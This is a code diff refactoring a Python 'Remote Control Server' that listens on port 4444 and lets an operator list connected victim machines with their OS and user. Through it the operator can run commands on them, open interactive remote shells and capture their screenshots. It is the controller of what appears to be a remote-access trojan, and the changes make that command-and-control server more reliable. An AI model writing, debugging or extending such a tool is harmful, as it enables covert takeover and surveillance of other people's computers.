@@ -7,23 +7,19 @@ import subprocess
 import time
 from datetime import datetime
 import struct
-import cv2
-import numpy as np
-import mss
-import mss.tools
-from io import BytesIO
-from PIL import Image
-import zlib
+import queue
+import select
 
 class RemoteServer:
     def __init__(self, host='0.0.0.0', port=4444):
         self.host = host
         self.port = port
-        self.clients = {}
-        self.pending_commands = {}
-        self.responses={}
+        self.clients = {}  # client_id: {'socket': socket, 'address': address, 'info': info}
+        self.client_responses = {}  # client_id: queue of responses
+        self.command_queues = {}  # client_id: queue of commands to send
         self.server_socket = None
         self.running = False
+        self.lock = threading.Lock()
         
     def start(self):
         """Start the server"""
@@ -57,16 +53,25 @@ class RemoteServer:
                 client_socket, client_address = self.server_socket.accept()
                 print(f"[+] New connection from {client_address}")
                 
+                # Set timeout for initial handshake
+                client_socket.settimeout(10)
+                
                 # Get client info
                 client_info = self.receive_data(client_socket)
                 if client_info:
                     client_id = client_info.get('client_id', str(client_address))
-                    self.clients[client_id] = {
-                        'socket': client_socket,
-                        'address': client_address,
-                        'info': client_info,
-                        'connected': True
-                    }
+                    
+                    with self.lock:
+                        self.clients[client_id] = {
+                            'socket': client_socket,
+                            'address': client_address,
+                            'info': client_info,
+                            'connected': True,
+                            'last_seen': time.time()
+                        }
+                        self.command_queues[client_id] = queue.Queue()
+                        self.client_responses[client_id] = queue.Queue()
+                    
                     print(f"[+] Client {client_id} connected - {client_info.get('os', 'Unknown')}")
                     
                     # Start handler for this client
@@ -77,95 +82,120 @@ class RemoteServer:
                     client_thread.daemon = True
                     client_thread.start()
                     
+            except socket.timeout:
+                continue
             except Exception as e:
                 if self.running:
                     print(f"[!] Connection error: {e}")
     
     def handle_client(self, client_id, client_socket):
         """Handle communication with a specific client"""
-        while self.running and client_id in self.clients:
+        client_socket.settimeout(1)  # Short timeout for responsive handling
+        
+        while self.running:
             try:
-                if hasattr(self, 'pending_commands') and client_id in self.pending_commands:
-                    command = self.pending_commands[client_id]
-                    del self.pending_commands[client_id]
-                # Check if there is a command waiting for THIS client
-                if client_id in self.pending_commands:
-                    command = self.pending_commands.pop(client_id) # Use pop to get and remove
+                # Check for commands to send
+                if client_id in self.command_queues:
+                    try:
+                        command = self.command_queues[client_id].get_nowait()
+                        print(f"[*] Sending command to {client_id}: {command.get('type', 'unknown')}")
+                        self.send_data(client_socket, command)
+                        
+                        # Wait for response with timeout
+                        response = self.receive_data_with_timeout(client_socket, timeout=30)
+                        if response:
+                            print(f"[*] Received response from {client_id}")
+                            self.client_responses[client_id].put(response)
+                        else:
+                            print(f"[!] No response from {client_id}")
+                            
+                    except queue.Empty:
+                        pass  # No commands to send
                 
-                    # Map internal command types to the client-side protocol
-                    cmd_type = command['type']
-                    if cmd_type == 'cmd':
-                        self.send_command(client_socket, 'execute', command['data'])
-                    elif cmd_type == 'screenshot':
-                        self.send_command(client_socket, 'screenshot', '')
-                    elif cmd_type == 'shell':
-                        self.send_command(client_socket, 'shell', command['data'])
+                # Also listen for spontaneous messages from client
+                try:
+                    data = self.receive_data(client_socket, timeout=0.5)
+                    if data:
+                        print(f"[*] Received data from {client_id}: {data.get('type', 'unknown')}")
+                        self.client_responses[client_id].put(data)
+                except socket.timeout:
+                    pass
                 
-                    # IMPORTANT: Immediately wait for the response after sending
-                    response = self.receive_data(client_socket, timeout=30)
-                    if response:
-                        self.handle_response(client_id, response)
-            
-                time.sleep(0.1) # Prevent CPU spiking
-            
+                # Update last seen
+                with self.lock:
+                    if client_id in self.clients:
+                        self.clients[client_id]['last_seen'] = time.time()
+                
+                time.sleep(0.1)
+                
+            except socket.timeout:
+                continue
             except Exception as e:
                 print(f"[!] Error with client {client_id}: {e}")
                 break
         
         # Clean up disconnected client
-        if client_id in self.clients:
-            del self.clients[client_id]
-            print(f"[-] Client {client_id} disconnected")
+        with self.lock:
+            if client_id in self.clients:
+                del self.clients[client_id]
+            if client_id in self.command_queues:
+                del self.command_queues[client_id]
+            if client_id in self.client_responses:
+                del self.client_responses[client_id]
+        
+        print(f"[-] Client {client_id} disconnected")
+        if client_socket:
+            client_socket.close()
     
-    def send_command(self, client_socket, command_type, data):
-        """Send command to client"""
+    def send_command(self, client_id, command_type, data):
+        """Send command to client and wait for response"""
+        if client_id not in self.clients:
+            print(f"[!] Client {client_id} not connected")
+            return None
+        
         command = {
             'type': command_type,
             'data': data,
-            'timestamp': datetime.now().isoformat()
+            'timestamp': datetime.now().isoformat(),
+            'command_id': int(time.time() * 1000)  # Unique command ID
         }
-        self.send_data(client_socket, command)
-    
-    def handle_response(self, client_id, response):
-        """Handle response from client"""
-        response_type = response.get('type', 'unknown')
         
-        if response_type == 'cmd_result' or response_type=='shell_result':
-            print(f"\n[CMD Result from {client_id}]")
-            print(response.get('data', 'No output'))
-            print("-" * 50)
-            
-        elif response_type == 'screenshot':
-            screenshot_data = response.get('data', '')
-            if screenshot_data:
+        # Clear any old responses
+        if client_id in self.client_responses:
+            while not self.client_responses[client_id].empty():
                 try:
-                    # Decode and save screenshot
-                    img_data = base64.b64decode(screenshot_data)
-                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                    filename = f"screenshot_{client_id}_{timestamp}.png"
-                    
-                    with open(filename, 'wb') as f:
-                        f.write(img_data)
-                    
-                    print(f"[+] Screenshot saved as {filename}")
-                    
-                    # Optionally display the image
-                    try:
-                        img = Image.open(BytesIO(img_data))
-                        img.show()
-                    except:
-                        pass
-                        
-                except Exception as e:
-                    print(f"[!] Failed to save screenshot: {e}")
+                    self.client_responses[client_id].get_nowait()
+                except queue.Empty:
+                    break
         
-        elif response_type == 'shell_result':
-            print(f"\n[SHELL Result from {client_id}]")
-            print(response.get('data', 'No output'))
-            print("-" * 50)
+        # Send command
+        self.command_queues[client_id].put(command)
         
-        elif response_type == 'error':
-            print(f"[!] Error from {client_id}: {response.get('data', 'Unknown error')}")
+        # Wait for response with timeout
+        start_time = time.time()
+        timeout = 60  # Increased timeout for commands that might take time
+        
+        while time.time() - start_time < timeout:
+            if client_id in self.client_responses:
+                try:
+                    response = self.client_responses[client_id].get(timeout=0.5)
+                    return response
+                except queue.Empty:
+                    pass
+            time.sleep(0.1)
+        
+        print(f"[!] Timeout waiting for response from {client_id}")
+        return None
+    
+    def receive_data_with_timeout(self, sock, timeout=30):
+        """Receive data with proper timeout handling"""
+        sock.settimeout(timeout)
+        try:
+            return self.receive_data(sock)
+        except socket.timeout:
+            return None
+        finally:
+            sock.settimeout(1)  # Reset to short timeout
     
     def send_data(self, sock, data):
         """Send JSON data over socket"""
@@ -175,43 +205,48 @@ class RemoteServer:
             sock.sendall(struct.pack('>I', len(json_data)))
             # Send data
             sock.sendall(json_data)
+            return True
         except Exception as e:
             print(f"[!] Send error: {e}")
+            return False
     
-    def receive_data(self, sock, timeout=5):
+    def receive_data(self, sock, timeout=None):
         """Receive JSON data from socket"""
-        try:
+        if timeout:
             sock.settimeout(timeout)
+        
+        try:
             # Receive length
-            raw_len = sock.recv(4)
-            if not raw_len:
+            raw_len = self.recv_all(sock, 4)
+            if not raw_len or len(raw_len) != 4:
                 return None
             msg_len = struct.unpack('>I', raw_len)[0]
             
             # Receive data
-            chunks = []
-            bytes_received = 0
-            while bytes_received < msg_len:
-                chunk = sock.recv(min(msg_len - bytes_received, 4096))
-                if not chunk:
-                    break
-                chunks.append(chunk)
-                bytes_received += len(chunk)
-            
-            if bytes_received == msg_len:
-                data = b''.join(chunks)
-                return json.loads(data.decode('utf-8'))
+            data = self.recv_all(sock, msg_len)
+            if data and len(data) == msg_len:
+                return json.loads(data.decode('utf-8', errors='ignore'))
             
         except socket.timeout:
             return None
         except Exception as e:
-            print(f"[!] Receive error: {e}")
             return None
+        finally:
+            if timeout:
+                sock.settimeout(1)  # Reset to default
+    
+    def recv_all(self, sock, n):
+        """Helper function to receive exactly n bytes"""
+        data = bytearray()
+        while len(data) < n:
+            packet = sock.recv(n - len(data))
+            if not packet:
+                return None
+            data.extend(packet)
+        return bytes(data)
     
     def command_interface(self):
         """Interactive command interface"""
-        self.pending_commands = {}
-        
         print("\n" + "="*60)
         print("Remote Control Server - Command Interface")
         print("="*60)
@@ -236,83 +271,16 @@ class RemoteServer:
                     break
                 
                 elif command.lower() == 'list':
-                    if not self.clients:
-                        print("[*] No clients connected")
-                    else:
-                        print("\nConnected Clients:")
-                        print("-" * 40)
-                        for client_id, client_info in self.clients.items():
-                            print(f"ID: {client_id}")
-                            print(f"  Address: {client_info['address']}")
-                            print(f"  OS: {client_info['info'].get('os', 'Unknown')}")
-                            print(f"  User: {client_info['info'].get('user', 'Unknown')}")
-                            print("-" * 40)
+                    self.list_clients()
                 
                 elif command.startswith('cmd '):
-                    parts = command.split(' ', 2)
-                    if len(parts) >= 3:
-                        client_id = parts[1]
-                        cmd = parts[2]
-                        
-                        if client_id in self.clients:
-                            self.responses[client_id]=None
-                            self.pending_commands[client_id] = {
-                                'type': 'cmd',
-                                'data': cmd
-                            }
-                            print(f"[*] Command sent to {client_id}")
-                            #from here it should show the result of cmd execution
-                            start_wait = time.time()
-                            while self.responses.get(client_id) is None and time.time() - start_wait < 10:
-                                time.sleep(0.1)
-                            
-                            # 4. Display the result
-                            if self.responses.get(client_id):
-                                print(self.responses[client_id])
-                                self.responses[client_id] = None # Clear it
-                            else:
-                                print("[!] Timeout: No response received from client.")
-                            
-                        else:
-                            print(f"[!] Client {client_id} not found")
+                    self.handle_cmd_command(command)
                 
                 elif command.startswith('shell '):
-                    parts = command.split(' ', 1)
-                    if len(parts) >= 2:
-                        client_id = parts[1]
-                        
-                        if client_id in self.clients:
-                            print(f"[*] Starting interactive shell with {client_id}")
-                            print("[*] Type 'exit' to return to server interface")
-                            
-                            while True:
-                                shell_cmd = input(f"shell@{client_id}> ").strip()
-                                if shell_cmd.lower() == 'exit':
-                                    break
-                                
-                                if shell_cmd:
-                                    self.pending_commands[client_id] = {
-                                        'type': 'shell',
-                                        'data': shell_cmd
-                                    }
-                                    time.sleep(1)  # Wait for response
-                        else:
-                            print(f"[!] Client {client_id} not found")
+                    self.handle_shell_command(command)
                 
                 elif command.startswith('screenshot '):
-                    parts = command.split(' ', 1)
-                    if len(parts) >= 2:
-                        client_id = parts[1]
-                        
-                        if client_id in self.clients:
-                            self.pending_commands[client_id] = {
-                                'type': 'screenshot',
-                                'data': ''
-                            }
-                            print(f"[*] Screenshot request sent to {client_id}")
-                            self.handle_client(client_id=client_id,client_socket=self.server_socket) #to see display
-                        else:
-                            print(f"[!] Client {client_id} not found")
+                    self.handle_screenshot_command(command)
                 
                 else:
                     print("[!] Unknown command")
@@ -324,11 +292,159 @@ class RemoteServer:
             except Exception as e:
                 print(f"[!] Command error: {e}")
     
+    def list_clients(self):
+        """List connected clients"""
+        with self.lock:
+            if not self.clients:
+                print("[*] No clients connected")
+            else:
+                print("\nConnected Clients:")
+                print("-" * 60)
+                for client_id, client_info in self.clients.items():
+                    print(f"ID: {client_id}")
+                    print(f"  Address: {client_info['address']}")
+                    print(f"  OS: {client_info['info'].get('os', 'Unknown')}")
+                    print(f"  User: {client_info['info'].get('user', 'Unknown')}")
+                    print(f"  Last Seen: {time.time() - client_info['last_seen']:.1f}s ago")
+                    print("-" * 60)
+    
+    def handle_cmd_command(self, command):
+        """Handle cmd command"""
+        parts = command.split(' ', 2)
+        if len(parts) >= 3:
+            client_id = parts[1]
+            cmd = parts[2]
+            
+            print(f"[*] Sending command to {client_id}: {cmd}")
+            response = self.send_command(client_id, 'execute', cmd)
+            
+            if response:
+                self.handle_response(client_id, response)
+            else:
+                print(f"[!] No response from {client_id}")
+        else:
+            print("[!] Usage: cmd <client_id> <command>")
+    
+    def handle_shell_command(self, command):
+        """Handle interactive shell command"""
+        parts = command.split(' ', 1)
+        if len(parts) >= 2:
+            client_id = parts[1]
+            
+            if client_id not in self.clients:
+                print(f"[!] Client {client_id} not found")
+                return
+            
+            print(f"[*] Starting interactive shell with {client_id}")
+            print("[*] Type 'exit' to return to server interface")
+            
+            while True:
+                try:
+                    shell_cmd = input(f"shell@{client_id}> ").strip()
+                    if shell_cmd.lower() == 'exit':
+                        break
+                    
+                    if shell_cmd:
+                        response = self.send_command(client_id, 'shell', shell_cmd)
+                        if response:
+                            self.handle_response(client_id, response)
+                        else:
+                            print(f"[!] No response from {client_id}")
+                            
+                except KeyboardInterrupt:
+                    print("\n[*] Exiting shell...")
+                    break
+                except Exception as e:
+                    print(f"[!] Shell error: {e}")
+        else:
+            print("[!] Usage: shell <client_id>")
+    
+    def handle_screenshot_command(self, command):
+        """Handle screenshot command"""
+        parts = command.split(' ', 1)
+        if len(parts) >= 2:
+            client_id = parts[1]
+            
+            print(f"[*] Requesting screenshot from {client_id}")
+            response = self.send_command(client_id, 'screenshot', '')
+            
+            if response:
+                self.handle_response(client_id, response)
+            else:
+                print(f"[!] No response from {client_id}")
+        else:
+            print("[!] Usage: screenshot <client_id>")
+    
+    def handle_response(self, client_id, response):
+        """Handle response from client"""
+        response_type = response.get('type', 'unknown')
+        
+        if response_type == 'cmd_result':
+            print(f"\n[CMD Result from {client_id}]")
+            print("-" * 60)
+            print(response.get('data', 'No output'))
+            print("-" * 60)
+            
+        elif response_type == 'screenshot':
+            screenshot_data = response.get('data', '')
+            if screenshot_data:
+                try:
+                    # Decode and save screenshot
+                    import zlib
+                    img_data = zlib.decompress(base64.b64decode(screenshot_data))
+                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                    filename = f"screenshot_{client_id}_{timestamp}.png"
+                    
+                    with open(filename, 'wb') as f:
+                        f.write(img_data)
+                    
+                    print(f"[+] Screenshot saved as {filename}")
+                    
+                    # Try to display the image
+                    try:
+                        from PIL import Image
+                        from io import BytesIO
+                        img = Image.open(BytesIO(img_data))
+                        img.show()
+                    except:
+                        print("[*] Could not display image (PIL not installed)")
+                        
+                except Exception as e:
+                    print(f"[!] Failed to save screenshot: {e}")
+            else:
+                print("[!] No screenshot data received")
+        
+        elif response_type == 'shell_result':
+            print(f"\n[SHELL Result from {client_id}]")
+            print("-" * 60)
+            print(response.get('data', 'No output'))
+            print("-" * 60)
+        
+        elif response_type == 'error':
+            print(f"[!] Error from {client_id}: {response.get('data', 'Unknown error')}")
+        
+        elif response_type == 'ping':
+            pass  # Ignore ping responses
+        
+        else:
+            print(f"[?] Unknown response type from {client_id}: {response_type}")
+            print(f"    Data: {response.get('data', 'No data')}")
+    
     def stop(self):
         """Stop the server"""
         self.running = False
         if self.server_socket:
             self.server_socket.close()
+        
+        # Close all client connections
+        with self.lock:
+            for client_id, client_info in list(self.clients.items()):
+                if client_info['socket']:
+                    try:
+                        client_info['socket'].close()
+                    except:
+                        pass
+        
         print("[*] Server stopped")
 
 if __name__ == "__main__":
